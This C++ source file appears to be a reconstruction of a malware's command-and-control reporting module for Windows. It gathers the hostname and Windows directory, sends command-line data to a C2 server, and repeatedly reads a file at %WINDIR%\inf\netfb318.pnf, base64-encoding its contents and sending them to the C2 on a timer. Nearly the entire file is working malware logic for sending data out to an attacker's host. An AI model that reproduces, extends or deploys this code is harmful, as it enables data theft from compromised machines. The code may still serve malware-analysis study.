// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include <Windows.h>
#include <memory>

#include "Base64.h"
#include "Core.h"
#include "Utils.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

// <<---------- BEGIN EASY CONFIGURATION ---------->>
#define UNK_FILE_PATH				L"\\inf\\netfb318.pnf"

#define COMMAND_DIRECTLY_SEND		'0'
#define COMMAND_REQUEST_FILE		'1'
// <<---------- END EASY CONFIGURATION ---------->>

int wmain(int argc, wchar_t *argv[], wchar_t *envp[])
{
	HANDLE hFile; // eax@7

	unsigned char pFileData[10240];
	unsigned char pPrevFileData[10240]; // [sp+28E8h] [bp-2808h]@17
	
	// Setup data
	DWORD nFileSize		= 0;
	INT32 nAttemptNr	= 0;
	bool bLongSleep		= false;
	
	// Get the current hostname
	if(GetHostname(g_szHostname) == false)
		g_szHostname[0] = 0;
	
	// Get the windows directory in char and wchar format
	GetWindowsDirectoryA(g_szWinDirA, 100);
	GetWindowsDirectoryW(g_szWinDirW, 100);

#ifdef _DEBUG
	printf("Hostname: %S\n", g_szHostname);
	printf("WindowsDirectoryA: %s\n", g_szWinDirA);
	printf("WindowsDirectoryW: %S\n", g_szWinDirW);

	extern WCHAR *g_C2_IP[1][1];
	printf("C&C IP: %S\n", g_C2_IP[0][0]);

	extern LPCWSTR g_C2_proxy[1];
	printf("C&C Proxy: %s\n", g_C2_proxy[0]);
	
	extern LPCWSTR g_C2_proxyBypass[1];
	printf("C&C Proxy Bypass: %s\n", g_C2_proxyBypass[0]);
#endif // _DEBUG
	
	// The C2 module need 1 argument to work
	if(argc >= 2)
	{
		if(*argv[1] == COMMAND_DIRECTLY_SEND) // Send data passed as second argument to the C2 or update data
		{
			WCHAR *pC2Data = NULL;

#ifdef _DEBUG
			printf("%s: CMD is COMMAND_DIRECTLY_SEND\n", __FUNCTION__);
#endif // _DEBUG
			
			if(argc >= 3)
			{
				// Allocate the memory where the data should be copied
				WCHAR *pTempBuffer = new WCHAR[wcslen(argv[2])+1];
				if(!pTempBuffer)
					return 0;
				
				// Copy argument into the allocate array
				wmemcpy(pTempBuffer, argv[2], wcslen(argv[2])+1);
				pC2Data = pTempBuffer;
			}
			
			SendDatoToC2(pC2Data);
			return 0;
		}
		
		if(*argv[1] == COMMAND_REQUEST_FILE)
		{
			// Setup data
			WCHAR szFilePath[100];
			_wprintf(szFilePath, L"%s%s", g_szWinDirW, UNK_FILE_PATH);
			
			INT32 nWaited	= 0;
			INT32 nToWait	= GetTickCount() % 60 + 7200; // 2 hours
			
			while(1)
			{
				// Routine to get the file netfb318.pnf from the C2
				while(1)
				{
					// Try to access the file
					hFile = CreateFileW(szFilePath, GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if(hFile != INVALID_HANDLE_VALUE)
						break;
					
					// If the file was accessible before and now no longer
					// wait for 2 hours before trying again
					if(bLongSleep == true)
					{
						bLongSleep = false;
						nToWait = GetTickCount() % 60 + 7200; // 2 hours
					}
					
					// If the limit time has been reached update the server about the
					// failure of opening the file including the attempts to open it
					if(nWaited == 0)
					{
						WCHAR *pAttemptNr = new WCHAR[2048];
						if(pAttemptNr)
						{
							_wprintf(pAttemptNr, L"%s%d", L"_", nAttemptNr);
							if(SendDatoToC2(pAttemptNr))
								nToWait = GetTickCount() % 60 + 7200; // 2 hours
							else
								nToWait = GetTickCount() % 60 + 600; // 10 minutes
						}
						++nAttemptNr;
					}
					
					// Sleep 5 seconds
					Sleep(5000);
					
					// If the limit time has been reached reset the counter
					if(5 * nWaited > nToWait)
						nWaited = -1;
					
					++nWaited;
				}
				
				// The file were accessible, so if in the future it is no longer
				// accessible, wait for 2 hours by setting bLongSleep true
				if(bLongSleep == false)
				{
					nWaited		= 0;
					nToWait		= 300; // 5 minutes
					bLongSleep	= true;
				}
				
				// Get the file size
				nFileSize = GetFileSize(hFile, 0);
				
				// If it is too big read only the first 0x2800 bytes
				if(nFileSize > 0x2800)
					nFileSize = 0x2800;
				
				// Read the file
				if(nFileSize)
				{
					DWORD nBytesRead = 0;
					ReadFile(hFile, pFileData, nFileSize, &nBytesRead, 0);
				}
				
				// Close the file handle
				CloseHandle(hFile);
				
				if(nFileSize)
				{
					// If the first byte of the file is 1 send to the server the content
					// of the file encoded and sleep for 5 minutes
					if(*pFileData == 1)
					{
						SendDatoToC2(base64_encode(nFileSize, pFileData));
						Sleep(300000); // 5 minutes
					}
					
					memcpy(pPrevFileData, pFileData, nFileSize);
				}
				
				// Every 5 minutes send the encoded content to the C2
				if(nWaited == 0 && nFileSize)
					CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SendDatoToC2, base64_encode(nFileSize, pPrevFileData), 0, 0);
				
				// Sleep 5 seconds
				Sleep(5000);
				
				// If the limit time has been reached reset the counter
				if(5 * nWaited > nToWait)
				{
					nWaited = -1;
					nToWait = 300;
				}
				
				// Close the file handle
				// NOTE: This is the second time the handle has been closed, resulting useless
				CloseHandle(hFile);
				++nWaited;
			}
		}
	}
	
	return 0;
}